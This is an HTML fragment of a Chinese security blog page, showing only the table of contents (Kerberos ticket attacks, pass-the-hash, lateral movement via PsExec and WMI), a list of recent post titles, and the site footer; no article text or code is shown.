class="toc-text">黄金票据Golden ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%B6%E7%A5%A8Silver-ticket"><span class="toc-number">2.1.5.</span> <span class="toc-text">银票Silver ticket</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-Pass-The-Hash"><span class="toc-number">2.2.</span> <span class="toc-text">PTH(Pass The Hash)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTK-Pass-The-Key"><span class="toc-number">2.3.</span> <span class="toc-text">PTK(Pass The Key)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">内网横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PsExec"><span class="toc-number">3.1.</span> <span class="toc-text">PsExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI"><span class="toc-number">3.2.</span> <span class="toc-text">WMI</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/" title="内网渗透探索"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透探索"/></a><div class="content"><a class="title" href="/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/" title="内网渗透探索">内网渗透探索</a><time datetime="2022-02-28T16:00:00.000Z" title="发表于 2022-03-01 00:00:00">2022-03-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/15/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/" title="HTTP走私攻击"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/8_高清放大.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTP走私攻击"/></a><div class="content"><a class="title" href="/2022/02/15/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/" title="HTTP走私攻击">HTTP走私攻击</a><time datetime="2022-02-14T16:00:00.000Z" title="发表于 2022-02-15 00:00:00">2022-02-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/09/sqli_labs%E9%80%9A%E5%85%B3/" title="sqli_labs通关"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqli_labs通关"/></a><div class="content"><a class="title" href="/2022/02/09/sqli_labs%E9%80%9A%E5%85%B3/" title="sqli_labs通关">sqli_labs通关</a><time datetime="2022-02-08T16:00:00.000Z" title="发表于 2022-02-09 00:00:00">2022-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/30/PHP%20Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP Session反序列化漏洞"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP Session反序列化漏洞"/></a><div class="content"><a class="title" href="/2022/01/30/PHP%20Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP Session反序列化漏洞">PHP Session反序列化漏洞</a><time datetime="2022-01-29T16:00:00.000Z" title="发表于 2022-01-30 00:00:00">2022-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" title="php反序列化字符逃逸"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/5.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化字符逃逸"/></a><div class="content"><a class="title" href="/2022/01/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" title="php反序列化字符逃逸">php反序列化字符逃逸</a><time datetime="2022-01-27T17:35:57.960Z" title="发表于 2022-01-28 01:35:57">2022-01-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Kenoeee</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
